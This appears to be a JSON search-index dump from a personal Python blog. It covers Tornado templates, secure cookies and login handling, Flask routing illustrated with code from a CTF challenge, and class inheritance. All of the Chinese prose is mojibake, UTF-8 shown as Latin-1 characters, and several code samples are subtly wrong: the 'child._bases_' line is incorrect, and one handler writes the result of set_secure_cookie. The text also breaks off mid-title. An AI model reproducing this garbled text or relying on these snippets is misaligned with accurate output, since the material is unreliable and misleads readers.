é€’ç»™Tornadoçš„HTTPServerå¯¹è±¡ï¼Œç„¶åä½¿ç”¨æˆ‘ä»¬åœ¨å‘½ä»¤è¡ŒæŒ‡å®šçš„ç«¯å£è¿›è¡Œç›‘å¬ï¼ˆé€šè¿‡optionså¯¹è±¡å–å‡ºã€‚ï¼‰æœ€åï¼Œåœ¨ç¨‹åºå‡†å¤‡å¥½æ¥æ”¶HTTPè¯·æ±‚åï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªTornadoçš„IOLoopçš„å®ä¾‹ã€‚ æ¨¡æ¿è¯­æ³•ä¸€ä¸ªTornadoæ¨¡æ¿ä»…ä»…æ˜¯ç”¨ä¸€äº›æ ‡è®°æŠŠPythonæ§åˆ¶åºåˆ—å’Œè¡¨è¾¾å¼åµŒå…¥ HTML(æˆ–è€…ä»»æ„å…¶ä»–æ–‡æœ¬æ ¼å¼)çš„æ–‡ä»¶ä¸­: 123456789101112&lt;html&gt; &lt;head&gt; &lt;title&gt;{{ title }}&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;ul&gt; {% for item in items %} &lt;li&gt;{{ escape(item) }}&lt;/li&gt; {% end %} &lt;/ul&gt; &lt;/body&gt; &lt;/html&gt; å¦‚æœä½ æŠŠè¿™ä¸ªç›®æ ‡ä¿å­˜ä¸ºâ€template.htmlâ€å¹¶ä¸”æŠŠå®ƒæ”¾åœ¨ä½ Pythonæ–‡ä»¶çš„ ç›¸åŒç›®å½•ä¸‹, ä½ å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ä»£ç æ¸²æŸ“å®ƒ: 1234class MainHandler(tornado.web.RequestHandler): def get(self): items = [&quot;Item 1&quot;, &quot;Item 2&quot;, &quot;Item 3&quot;] self.render(&quot;template.html&quot;, title=&quot;My title&quot;, items=items) Tornadoæ¨¡æ¿æ”¯æŒ æ§åˆ¶è¯­å¥(control statements) å’Œ è¡¨è¾¾å¼(expressions). æ§åˆ¶è¯­å¥è¢«åŒ…åœ¨ {%` å’Œ `%} ä¸­é—´, e.g., {% if len(items) > 2 %}. è¡¨è¾¾å¼è¢«åŒ…åœ¨ {{` å’Œ `}} ä¹‹é—´, e.g., {{ items[0] }}. æ§åˆ¶è¯­å¥æˆ–å¤šæˆ–å°‘éƒ½å’ŒPythonè¯­å¥ç±»ä¼¼. æˆ‘ä»¬æ”¯æŒ if, for, while, å’Œ try, è¿™äº›éƒ½å¿…é¡»ä½¿ç”¨ {% end %} æ¥æ ‡è¯†ç»“æŸ. æˆ‘ä»¬ä¹Ÿ æ”¯æŒ æ¨¡æ¿ç»§æ‰¿(template inheritance) ä½¿ç”¨ extends å’Œ block æ ‡ç­¾å£°æ˜, è¿™äº›å†…å®¹çš„è¯¦ç»†ä¿¡æ¯éƒ½å¯ä»¥åœ¨ tornado.template ä¸­çœ‹åˆ°. è¡¨è¾¾å¼å¯ä»¥æ˜¯ä»»æ„çš„Pythonè¡¨è¾¾å¼, åŒ…æ‹¬å‡½æ•°è°ƒç”¨. æ¨¡æ¿ä»£ç ä¼šåœ¨åŒ…å«ä»¥ä¸‹å¯¹è±¡ å’Œå‡½æ•°çš„å‘½åç©ºé—´ä¸­æ‰§è¡Œ (æ³¨æ„è¿™ä¸ªåˆ—è¡¨é€‚ç”¨äºä½¿ç”¨ RequestHandler.render å’Œ render_string æ¸²æŸ“æ¨¡æ¿çš„æƒ…å†µ. å¦‚æœä½ ç›´æ¥åœ¨ RequestHandler ä¹‹å¤–ä½¿ç”¨ tornado.template æ¨¡å—, ä¸‹é¢è¿™äº›å¾ˆå¤šéƒ½ä¸å­˜ åœ¨). escape: tornado.escape.xhtml_escape çš„åˆ«å xhtml_escape: tornado.escape.xhtml_escape çš„åˆ«å url_escape: tornado.escape.url_escape çš„åˆ«å json_encode: tornado.escape.json_encode çš„åˆ«å squeeze: tornado.escape.squeeze çš„åˆ«å linkify: tornado.escape.linkify çš„åˆ«å datetime: Python datetime æ¨¡å— handler: å½“å‰çš„ RequestHandler å¯¹è±¡ request: handler.request çš„åˆ«å current_user: handler.current_user çš„åˆ«å locale: handler.locale çš„åˆ«å _: handler.locale.translate çš„åˆ«å static_url: handler.static_url çš„åˆ«å xsrf_form_html: handler.xsrf_form_html çš„åˆ«å reverse_url: Application.reverse_url çš„åˆ«å æ‰€æœ‰ä» ui_methods å’Œ ui_modules Application è®¾ç½®çš„æ¡ç›® ä»»ä½•ä¼ é€’ç»™ render æˆ– render_string çš„å…³é”®å­—å‚æ•° å½“ä½ æ­£åœ¨æ„å»ºä¸€ä¸ªçœŸæ­£çš„åº”ç”¨, ä½ å¯èƒ½æƒ³è¦ä½¿ç”¨Tornadoæ¨¡æ¿çš„æ‰€æœ‰ç‰¹æ€§, å°¤å…¶æ˜¯ç›®æ ‡ç»§æ‰¿. é˜…è¯»æ‰€æœ‰å…³äºè¿™äº›ç‰¹æ€§çš„ä»‹ç»åœ¨ tornado.template éƒ¨åˆ† (ä¸€äº›ç‰¹æ€§, åŒ…æ‹¬ UIModules æ˜¯åœ¨ tornado.web æ¨¡å—ä¸­å®ç°çš„) åœ¨å¼•æ“ä¸‹, Tornadoæ¨¡æ¿è¢«ç›´æ¥è½¬æ¢ä¸ºPython. åŒ…å«åœ¨ä½ æ¨¡æ¿ä¸­çš„è¡¨è¾¾å¼ä¼š é€å­—çš„å¤åˆ¶åˆ°ä¸€ä¸ªä»£è¡¨ä½ æ¨¡æ¿çš„Pythonå‡½æ•°ä¸­. æˆ‘ä»¬ä¸ä¼šè¯•å›¾é˜»æ­¢æ¨¡æ¿è¯­è¨€ ä¸­çš„ä»»ä½•ä¸œè¥¿; æˆ‘ä»¬æ˜ç¡®çš„åˆ›é€ ä¸€ä¸ªé«˜åº¦çµæ´»çš„æ¨¡æ¿ç³»ç»Ÿ, è€Œä¸æ˜¯æœ‰ä¸¥æ ¼é™åˆ¶ çš„æ¨¡æ¿ç³»ç»Ÿ. å› æ­¤, å¦‚æœä½ åœ¨æ¨¡æ¿è¡¨è¾¾å¼ä¸­éšæ„å¡«å……(ä»£ç ), å½“ä½ æ‰§è¡Œå®ƒçš„æ—¶ å€™ä½ ä¹Ÿä¼šå¾—åˆ°å„ç§éšæœºé”™è¯¯. æ‰€æœ‰æ¨¡æ¿è¾“å‡ºé»˜è®¤éƒ½ä¼šä½¿ç”¨ tornado.escape.xhtml_escape å‡½æ•°è½¬ä¹‰. è¿™ä¸ªè¡Œä¸ºå¯ä»¥é€šè¿‡ä¼ é€’ autoescape=None ç»™ Application æˆ–è€… tornado.template.Loader æ„é€ å™¨æ¥å…¨å±€æ”¹å˜, å¯¹äºä¸€ä¸ªæ¨¡æ¿æ–‡ä»¶å¯ä»¥ä½¿ ç”¨ {% autoescape None %} æŒ‡ä»¤, å¯¹äºä¸€ä¸ªå•ä¸€è¡¨è¾¾å¼å¯ä»¥ä½¿ç”¨ {% raw ...%} æ¥ä»£æ›¿ {{ ... }}. æ­¤å¤–, åœ¨æ¯ä¸ªåœ°æ–¹ä¸€ä¸ªå¯é€‰çš„ è½¬ä¹‰å‡½æ•°åå¯ä»¥è¢«ç”¨æ¥ä»£æ›¿ None. æ³¨æ„, è™½ç„¶Tornadoçš„è‡ªåŠ¨è½¬ä¹‰åœ¨é¢„é˜²XSSæ¼æ´ä¸Šæ˜¯æœ‰å¸®åŠ©çš„, ä½†æ˜¯å®ƒå¹¶ä¸èƒ½ èƒœä»»æ‰€æœ‰çš„æƒ…å†µ. åœ¨æŸä¸€ä½ç½®å‡ºç°çš„è¡¨è¾¾å¼, ä¾‹å¦‚Javascript æˆ– CSS, å¯èƒ½éœ€ è¦å¦å¤–çš„è½¬ä¹‰. æ­¤å¤–, è¦ä¹ˆæ˜¯å¿…é¡»æ³¨æ„æ€»æ˜¯åœ¨å¯èƒ½åŒ…å«ä¸å¯ä¿¡å†…å®¹çš„HTMLä¸­ ä½¿ç”¨åŒå¼•å·å’Œ xhtml_escape , è¦ä¹ˆå¿…é¡»åœ¨å±æ€§ä¸­ä½¿ç”¨å•ç‹¬çš„è½¬ä¹‰å‡½æ•° (å‚è§ e.g. http://wonko.com/post/html-escaping) è®¤è¯å’Œå®‰å…¨Cookies å’Œ secure cookiesä½ å¯ä»¥åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­é€šè¿‡ set_cookie æ–¹æ³•è®¾ç½® cookie: 1234567class MainHandler(tornado.web.RequestHandler): def get(self): if not self.get_cookie(&quot;mycookie&quot;): self.set_cookie(&quot;mycookie&quot;, &quot;myvalue&quot;) self.write(&quot;Your cookie was not set yet!&quot;) else: self.write(&quot;Your cookie was set!&quot;) æ™®é€šçš„cookieå¹¶ä¸å®‰å…¨, å¯ä»¥é€šè¿‡å®¢æˆ·ç«¯ä¿®æ”¹. å¦‚æœä½ éœ€è¦é€šè¿‡è®¾ç½®cookie, ä¾‹å¦‚æ¥è¯†åˆ«å½“å‰ç™»å½•çš„ç”¨æˆ·, å°±éœ€è¦ç»™ä½ çš„cookieç­¾åé˜²æ­¢ä¼ªé€ . Tornado æ”¯æŒé€šè¿‡ set_secure_cookie å’Œ get_secure_cookie æ–¹æ³•å¯¹cookieç­¾å. æƒ³è¦ä½¿ç”¨è¿™ äº›æ–¹æ³•, ä½ éœ€è¦åœ¨ä½ åˆ›å»ºåº”ç”¨çš„æ—¶å€™, æŒ‡å®šä¸€ä¸ªåä¸º cookie_secret çš„å¯†é’¥. ä½ å¯ä»¥åœ¨åº”ç”¨çš„è®¾ç½®ä¸­ä»¥å…³é”®å­—å‚æ•°çš„å½¢å¼ä¼ é€’ç»™åº”ç”¨ç¨‹åº: 123application = tornado.web.Application([ (r&quot;/&quot;, MainHandler),], cookie_secret=&quot;__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__&quot;) ç­¾ååçš„cookieé™¤äº†æ—¶é—´æˆ³å’Œä¸€ä¸ª HMAC ç­¾åè¿˜åŒ…å«ç¼–ç  åçš„cookieå€¼. å¦‚æœcookieè¿‡æœŸæˆ–è€…ç­¾åä¸åŒ¹é…, get_secure_cookie å°†è¿”å› None å°±åƒæ²¡æœ‰è®¾ç½®cookieä¸€æ ·. ä¸Šé¢ä¾‹å­çš„å®‰å…¨ç‰ˆæœ¬: 1234567class MainHandler(tornado.web.RequestHandler): def get(self): if not self.get_secure_cookie(&quot;mycookie&quot;): self.set_secure_cookie(&quot;mycookie&quot;, &quot;myvalue&quot;) self.write(&quot;Your cookie was not set yet!&quot;) else: self.write(&quot;Your cookie was set!&quot;) Tornadoçš„å®‰å…¨cookieä¿è¯å®Œæ•´æ€§ä½†æ˜¯ä¸ä¿è¯æœºå¯†æ€§. ä¹Ÿå°±æ˜¯è¯´, cookieä¸èƒ½è¢«ä¿®æ”¹ ä½†æ˜¯å®ƒçš„å†…å®¹å¯¹ç”¨æˆ·æ˜¯å¯è§çš„. å¯†é’¥ cookie_secret æ˜¯ä¸€ä¸ªå¯¹ç§°çš„key, è€Œä¸”å¿… é¡»ä¿å¯†â€“ä»»ä½•è·å¾—è¿™ä¸ªkeyçš„äººéƒ½å¯ä»¥ä¼ªé€ å‡ºè‡ªå·±ç­¾åçš„cookie. é»˜è®¤æƒ…å†µä¸‹, Tornadoçš„å®‰å…¨cookieè¿‡æœŸæ—¶é—´æ˜¯30å¤©. å¯ä»¥ç»™ set_secure_cookie ä½¿ç”¨ expires_days å…³é”®å­—å‚æ•° åŒæ—¶ get_secure_cookie è®¾ç½® max_age_days å‚æ•°ä¹Ÿå¯ä»¥è¾¾åˆ°æ•ˆæœ. è¿™ä¸¤ä¸ªå€¼åˆ†åˆ«é€šè¿‡è¿™æ ·(è®¾ç½®)ä½ å°±å¯ä»¥è¾¾ åˆ°å¦‚ä¸‹çš„æ•ˆæœ, ä¾‹å¦‚å¤§å¤šæ•°æƒ…å†µä¸‹æœ‰30å¤©æœ‰æ•ˆæœŸçš„cookie, ä½†æ˜¯å¯¹æŸäº›æ•æ„Ÿæ“ä½œ(ä¾‹ å¦‚ä¿®æ”¹è´¦å•ä¿¡æ¯)ä½ å¯ä»¥ä½¿ç”¨ä¸€ä¸ªè¾ƒå°çš„ max_age_days . Tornadoä¹Ÿæ”¯æŒå¤šç­¾åå¯†é’¥, ä½¿ç­¾åå¯†é’¥è½®æ¢. ç„¶å cookie_secret å¿…é¡»æ˜¯ä¸€ä¸ª ä»¥æ•´æ•°keyç‰ˆæœ¬ä½œä¸ºkey, ä»¥ç›¸å¯¹åº”çš„å¯†é’¥ä½œä¸ºå€¼çš„å­—å…¸. å½“å‰ä½¿ç”¨çš„ç­¾åé”® å¿…é¡»æ˜¯ åº”ç”¨è®¾ç½®ä¸­ key_version çš„é›†åˆ. ä¸è¿‡å­—å…¸ä¸­çš„å…¶ä»–keyéƒ½å…è®¸åš cookieç­¾åéªŒè¯, å¦‚æœå½“å‰keyç‰ˆæœ¬åœ¨cookieé›†åˆä¸­.ä¸ºäº†å®ç°cookieæ›´æ–°, å¯ä»¥é€šè¿‡ get_secure_cookie_key_version æŸ¥è¯¢å½“å‰keyç‰ˆæœ¬. ç”¨æˆ·è®¤è¯å½“å‰å·²ç»é€šè¿‡è®¤è¯çš„ç”¨æˆ·åœ¨æ¯ä¸ªè¯·æ±‚å¤„ç†å‡½æ•°ä¸­éƒ½å¯ä»¥é€šè¿‡ self.current_user å¾—åˆ°, åœ¨æ¯ä¸ªæ¨¡æ¿ä¸­ å¯ä»¥ä½¿ç”¨ current_user è·å¾—. é»˜è®¤æƒ…å†µä¸‹, current_user æ˜¯ None. ä¸ºäº†åœ¨ä½ çš„åº”ç”¨ç¨‹åºä¸­å®ç°ç”¨æˆ·è®¤è¯, ä½ éœ€è¦åœ¨ä½ çš„è¯·æ±‚å¤„ç†å‡½æ•°ä¸­å¤å†™ get_current_user() æ–¹æ³•æ¥åˆ¤æ–­å½“å‰ç”¨æˆ·, æ¯”å¦‚å¯ä»¥åŸºäºcookieçš„å€¼. è¿™é‡Œæœ‰ä¸€ä¸ªä¾‹å­, è¿™ä¸ªä¾‹å­å…è®¸ç”¨æˆ·ç®€å•çš„é€šè¿‡ä¸€ä¸ªä¿å­˜åœ¨cookieä¸­çš„ç‰¹æ®Šæ˜µç§° ç™»å½•åˆ°åº”ç”¨ç¨‹åºä¸­: 123456789101112131415161718192021222324252627class BaseHandler(tornado.web.RequestHandler): def get_current_user(self): return self.get_secure_cookie(&quot;user&quot;)class MainHandler(BaseHandler): def get(self): if not self.current_user: self.redirect(&quot;/login&quot;) return name = tornado.escape.xhtml_escape(self.current_user) self.write(&quot;Hello, &quot; + name)class LoginHandler(BaseHandler): def get(self): self.write('&lt;html&gt;&lt;body&gt;&lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;' 'Name: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;' '&lt;input type=&quot;submit&quot; value=&quot;Sign in&quot;&gt;' '&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;') def post(self): self.set_secure_cookie(&quot;user&quot;, self.get_argument(&quot;name&quot;)) self.redirect(&quot;/&quot;)application = tornado.web.Application([ (r&quot;/&quot;, MainHandler), (r&quot;/login&quot;, LoginHandler),], cookie_secret=&quot;__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__&quot;) ä½ å¯ä»¥ä½¿ç”¨ Python è£…é¥°å™¨(decorator) tornado.web.authenticated è¦æ±‚ç”¨æˆ·ç™»å½•. å¦‚æœè¯·æ±‚æ–¹æ³•å¸¦æœ‰è¿™ä¸ªè£…é¥°å™¨ å¹¶ä¸”ç”¨æˆ·æ²¡æœ‰ç™»å½•, ç”¨æˆ·å°†ä¼šè¢«é‡å®šå‘åˆ° login_url (å¦ä¸€ä¸ªåº”ç”¨è®¾ç½®). ä¸Šé¢çš„ä¾‹å­å¯ä»¥è¢«é‡å†™: 1234567891011121314class MainHandler(BaseHandler): @tornado.web.authenticated def get(self): name = tornado.escape.xhtml_escape(self.current_user) self.write(&quot;Hello, &quot; + name)settings = { &quot;cookie_secret&quot;: &quot;__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__&quot;, &quot;login_url&quot;: &quot;/login&quot;,}application = tornado.web.Application([ (r&quot;/&quot;, MainHandler), (r&quot;/login&quot;, LoginHandler),], **settings) å¦‚æœä½ ä½¿ç”¨ authenticated è£…é¥° post() æ–¹æ³•å¹¶ä¸”ç”¨æˆ·æ²¡æœ‰ç™»å½•, æœåŠ¡å°†è¿”å›ä¸€ä¸ª 403 å“åº”. @authenticated è£…é¥°å™¨æ˜¯ if not self.current_user: self.redirect() çš„ç®€å†™. å¯èƒ½ä¸é€‚åˆ éåŸºäºæµè§ˆå™¨çš„ç™»å½•æ–¹æ¡ˆ. é€šè¿‡ Tornado Blog example application å¯ä»¥çœ‹åˆ°ä¸€ä¸ªä½¿ç”¨ç”¨æˆ·éªŒè¯(å¹¶ä¸”åœ¨MySQLæ•°æ®åº“ä¸­å­˜å‚¨ç”¨æˆ·æ•°æ®)çš„å®Œæ•´ä¾‹å­. ä»£ç æ¨¡æ¿123456789101112131415import tornadoimport tornado.ioloopsettings={&quot;cookie_secret&quot;:&quot;å†…å®¹&quot;}class indexhandler(tornado.web.RequestHandler): def get(self): self.set_secure_cookie(&quot;username&quot;,&quot;cookieå€¼çš„å†…å®¹&quot;) self.write(self.set_secure_cookie(&quot;username&quot;))if __name__ == &quot;__main__&quot;: app=tornado.web.Application( [ (r&quot;/&quot;,indexhandler), ],**settings#cooki_secret:xxxxçš„ç®€å†™ ) app.listen(8004)#ç«¯å£æ³¨æ„åˆ«å†²çª tornado.ioloop.IOLoop.current().start()","link":"/2021/03/03/python-Tornado%E5%AD%A6%E4%B9%A0/"},{"title":"pythonä»£ç å®¡è®¡åŸºç¡€è¯­æ³•","text":"å‰è¨€æœ€è¿‘åšåˆ°ä¸€é¢˜pythonä»£ç å®¡è®¡çš„é¢˜ç›®ï¼Œä½†æ˜¯æ€»è§‰å¾—æœ‰ç‚¹åŠ›ä¸ä»å¿ƒï¼Œå¤§æ¦‚æ˜¯æŒæ¡çš„è¿˜ä¸å¤Ÿæ‰å®,æ•…å†³å®šæ•´ç†ä¸€ä¸‹é‡åˆ°çš„ä¸€è¯­æ³•çŸ¥è¯† è¯­æ³•åŸºç¡€è·¯ç”±æ‰€è°“è·¯ç”±ï¼Œ**å°±æ˜¯å¤„ç†è¯·æ±‚URLå’Œå‡½æ•°ä¹‹é—´å…³ç³»çš„ç¨‹åº**Flaskä¸­ä¹Ÿæ˜¯å¯¹URLè§„åˆ™è¿›è¡Œç»Ÿä¸€ç®¡ç†çš„ï¼Œåˆ›å»ºURLè§„åˆ™æœ‰ä¸¤ç§æ–¹å¼ï¼š 1.ä½¿ç”¨@app.routeä¿®é¥°å™¨ï¼Œå¹¶ä¼ å…¥URLè§„åˆ™ä½œä¸ºå‚æ•°ï¼Œå°†å‡½æ•°ç»‘å®šåˆ°URLï¼Œè¿™ä¸ªè¿‡ç¨‹ä¾¿å°†ä¸€ä¸ªå‡½æ•°æ³¨å†Œä¸ºè·¯ç”±ï¼Œè¿™ä¸ªå‡½æ•°åˆ™è¢«ç§°ä¸ºè§†å›¾å‡½æ•°ã€‚ 2.ä½¿ç”¨app.add_url_rule()ã€‚ 1234567891011121314151617181920@app.route(&quot;/geneSign&quot;, methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; #è¿™é‡Œè¿›è¡Œå’Œç§˜é’¥çš„æ‹¼æ¥åmd5çš„åŠ å¯†ä¼ å›å€¼ return getSign(action, param)@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) #è¿™é‡Œæ˜¯ä»cookieä¼ å›sign sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr #æœ‰ä¸ªwaf if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route('/') è¿™æ®µä»£ç æ„å‘³ç€è¿™ä¸ªç½‘å€æœ‰ä¸‰ä¸ªé¡µé¢ä¸€ä¸ªæ˜¯/geneSign ä¸€ä¸ªæ˜¯/De1ta å¦ä¸€ä¸ªå°±æ˜¯/æ ¹ç›®å½•ï¼Œæ¯ä¸€ä¸ªè·¯ç”±éƒ½æ˜¯ä¸€ä¸ªæ–°çš„èµ·ç‚¹","link":"/2021/04/09/python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"title":"pythonç±»çš„ç»§æ‰¿","text":"æ¦‚è¿° é¢å‘å¯¹è±¡ç¼–ç¨‹ (OOP) è¯­è¨€çš„ä¸€ä¸ªä¸»è¦åŠŸèƒ½å°±æ˜¯â€œç»§æ‰¿â€ã€‚ç»§æ‰¿æ˜¯æŒ‡è¿™æ ·ä¸€ç§èƒ½åŠ›ï¼šå®ƒå¯ä»¥ä½¿ç”¨ç°æœ‰ç±»çš„æ‰€æœ‰åŠŸèƒ½ï¼Œå¹¶åœ¨æ— éœ€é‡æ–°ç¼–å†™åŸæ¥çš„ç±»çš„æƒ…å†µä¸‹å¯¹è¿™äº›åŠŸèƒ½è¿›è¡Œæ‰©å±•ã€‚ é€šè¿‡ç»§æ‰¿åˆ›å»ºçš„æ–°ç±»ç§°ä¸ºâ€œå­ç±»â€æˆ–â€œæ´¾ç”Ÿç±»â€ï¼Œè¢«ç»§æ‰¿çš„ç±»ç§°ä¸ºâ€œåŸºç±»â€ã€â€œçˆ¶ç±»â€æˆ–â€œè¶…ç±»â€ï¼Œç»§æ‰¿çš„è¿‡ç¨‹ï¼Œå°±æ˜¯ä»ä¸€èˆ¬åˆ°ç‰¹æ®Šçš„è¿‡ç¨‹ã€‚åœ¨æŸäº› OOP è¯­è¨€ä¸­ï¼Œä¸€ä¸ªå­ç±»å¯ä»¥ç»§æ‰¿å¤šä¸ªåŸºç±»ã€‚ä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸€ä¸ªå­ç±»åªèƒ½æœ‰ä¸€ä¸ªåŸºç±»ï¼Œè¦å®ç°å¤šé‡ç»§æ‰¿ï¼Œå¯ä»¥é€šè¿‡å¤šçº§ç»§æ‰¿æ¥å®ç°ã€‚ ç»§æ‰¿æ¦‚å¿µçš„å®ç°æ–¹å¼ä¸»è¦æœ‰2ç±»ï¼šå®ç°ç»§æ‰¿ã€æ¥å£ç»§æ‰¿ã€‚ å®ç°ç»§æ‰¿æ˜¯æŒ‡ä½¿ç”¨åŸºç±»çš„å±æ€§å’Œæ–¹æ³•è€Œæ— éœ€é¢å¤–ç¼–ç çš„èƒ½åŠ›ã€‚ æ¥å£ç»§æ‰¿æ˜¯æŒ‡ä»…ä½¿ç”¨å±æ€§å’Œæ–¹æ³•çš„åç§°ã€ä½†æ˜¯å­ç±»å¿…é¡»æä¾›å®ç°çš„èƒ½åŠ›(å­ç±»é‡æ„çˆ¹ç±»æ–¹æ³•)ã€‚ åœ¨è€ƒè™‘ä½¿ç”¨ç»§æ‰¿æ—¶ï¼Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼Œé‚£å°±æ˜¯ä¸¤ä¸ªç±»ä¹‹é—´çš„å…³ç³»åº”è¯¥æ˜¯â€œå±äºâ€å…³ç³»ã€‚ä¾‹å¦‚ï¼ŒEmployee æ˜¯ä¸€ä¸ªäººï¼ŒManager ä¹Ÿæ˜¯ä¸€ä¸ªäººï¼Œå› æ­¤è¿™ä¸¤ä¸ªç±»éƒ½å¯ä»¥ç»§æ‰¿ Person ç±»ã€‚ä½†æ˜¯ Leg ç±»å´ä¸èƒ½ç»§æ‰¿ Person ç±»ï¼Œå› ä¸ºè…¿å¹¶ä¸æ˜¯ä¸€ä¸ªäººã€‚ OOå¼€å‘èŒƒå¼å¤§è‡´ä¸ºï¼šåˆ’åˆ†å¯¹è±¡â†’æŠ½è±¡ç±»â†’å°†ç±»ç»„ç»‡æˆä¸ºå±‚æ¬¡åŒ–ç»“æ„(ç»§æ‰¿å’Œåˆæˆ) â†’ç”¨ç±»ä¸å®ä¾‹è¿›è¡Œè®¾è®¡å’Œå®ç°å‡ ä¸ªé˜¶æ®µã€‚ ç»§æ‰¿çš„å®šä¹‰12345678910111213141516171819202122class Person(object): # å®šä¹‰ä¸€ä¸ªçˆ¶ç±» def talk(self): # çˆ¶ç±»ä¸­çš„æ–¹æ³• print(&quot;person is talking....&quot;) class Child(Person): # å®šä¹‰ä¸€ä¸ªå­ç±»ï¼Œ ç»§æ‰¿Personç±» def walk(self): # åœ¨å­ç±»ä¸­å®šä¹‰å…¶è‡ªèº«çš„æ–¹æ³• print('is walking...') c = Child()c.talk() # è°ƒç”¨ç»§æ‰¿çš„Personç±»çš„æ–¹æ³•c.walk() # è°ƒç”¨æœ¬èº«çš„æ–¹æ³•#_bases_å¯ä»¥æŸ¥çœ‹çˆ¶ç±»print(&quot;thebases are:&quot;,child._bases_) # è¾“å‡º person is talking....is walking... å®ç°ç»§æ‰¿åï¼Œå­ç±»å°†ç»§æ‰¿çˆ¶ç±»çš„å±æ€§ï¼Œä½†docå±æ€§ä¸ä¼šè¢«ç»§æ‰¿ ç»å…¸ç±»çš„å†™æ³•ï¼š çˆ¶ç±»åç§°.init(self,å‚æ•°1ï¼Œå‚æ•°2ï¼Œâ€¦) å½“åœ¨Pythonä¸­å‡ºç°ç»§æ‰¿çš„æƒ…å†µæ—¶ï¼Œä¸€å®šè¦æ³¨æ„åˆå§‹åŒ–å‡½æ•°_init_çš„è¡Œä¸º: å¦‚æœå­ç±»æ²¡æœ‰å®šä¹‰è‡ªå·±çš„åˆå§‹åŒ–å‡½æ•°ï¼Œçˆ¶ç±»çš„åˆå§‹åŒ–å‡½æ•°ä¼šè¢«é»˜è®¤è°ƒç”¨ï¼›ä½†æ˜¯å¦‚æœè¦å®ä¾‹åŒ–å­ç±»çš„å¯¹è±¡ï¼Œåˆ™åªèƒ½ä¼ å…¥çˆ¶ç±»çš„åˆå§‹åŒ–å‡½æ•°å¯¹åº”çš„å‚æ•°ï¼Œå¦åˆ™ä¼šå‡ºé”™ã€‚å¦‚æœå­ç±»å®šä¹‰äº†è‡ªå·±çš„åˆå§‹åŒ–å‡½æ•°ï¼Œè€Œåœ¨å­ç±»ä¸­æ²¡æœ‰æ˜¾ç¤ºè°ƒç”¨çˆ¶ç±»çš„åˆå§‹åŒ–å‡½æ•°ï¼Œåˆ™çˆ¶ç±»çš„å±æ€§ä¸ä¼šè¢«åˆå§‹åŒ–å¦‚æœå­ç±»å®šä¹‰äº†è‡ªå·±çš„åˆå§‹åŒ–å‡½æ•°ï¼Œåœ¨å­ç±»ä¸­æ˜¾ç¤ºè°ƒç”¨çˆ¶ç±»ï¼Œå­ç±»å’Œçˆ¶ç±»çš„å±æ€§éƒ½ä¼šè¢«åˆå§‹åŒ– æ–°å¼ç±»çš„å†™æ³•ï¼šsuper(å­ç±»ï¼Œself).init(å‚æ•°1ï¼Œå‚æ•°2ï¼Œâ€¦.) superä¸»è¦æ¥è°ƒç”¨çˆ¶ç±»æ–¹æ³•æ¥æ˜¾ç¤ºè°ƒç”¨çˆ¶ç±»ï¼Œåœ¨å­ç±»ä¸­ï¼Œä¸€èˆ¬ä¼šå®šä¹‰ä¸çˆ¶ç±»ç›¸åŒçš„å±æ€§ï¼ˆæ•°æ®å±æ€§ï¼Œæ–¹æ³•ï¼‰ï¼Œä»è€Œæ¥å®ç°å­ç±»ç‰¹æœ‰çš„è¡Œä¸ºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå­ç±»ä¼šç»§æ‰¿çˆ¶ç±»çš„æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼Œå­ç±»ä¹Ÿå¯ä»¥è¦†ç›–çˆ¶ç±»åŒåçš„å±æ€§å’Œæ–¹æ³•ã€‚ 12345678910111213141516171819202122232425class Person(object): def __init__(self, name, age): self.name = name self.age = age self.weight = 'weight' def talk(self): print(&quot;person is talking....&quot;) class Chinese(Person): #c bigberg 22 chinese def __init__(self, name, age, language): # å…ˆç»§æ‰¿ï¼Œåœ¨é‡æ„ Person.__init__(self, name, age) #ç»§æ‰¿çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥å†™æˆï¼šsuper(Chinese,self).__init__(name,age) self.language = language # å®šä¹‰ç±»çš„æœ¬èº«å±æ€§ def walk(self): print('is walking...') class American(Person): pass c = Chinese('bigberg', 22, 'Chinese') ç±»æ„é€ å‡½æ•°åŸºç¡€çˆ¶ç±»æ„é€ å‡½æ•°è¿‡ç¨‹å¦‚ä¸‹ï¼š å®ä¾‹åŒ–å¯¹è±¡c â€”-&gt; c è°ƒç”¨å­ç±»__init__() â€”- &gt; å­ç±»__init__()ç»§æ‰¿çˆ¶ç±»__init__() â€”â€“ &gt; è°ƒç”¨çˆ¶ç±» __init__() å‚è€ƒï¼šhttps://blog.csdn.net/brucewong0516/article/details/79121179https://www.liaoxuefeng.com/wiki/1016959663602400/1017594591051072https://www.cnblogs.com/bigberg/p/7182741.html","link":"/2021/02/27/python%E7%B1%BB%E7%9A%84%E7%BB%A7%E6%89%BF/"},{"title":"pythonç±»ç›¸å…³åŸºç¡€çŸ¥è¯†å­¦ä¹ 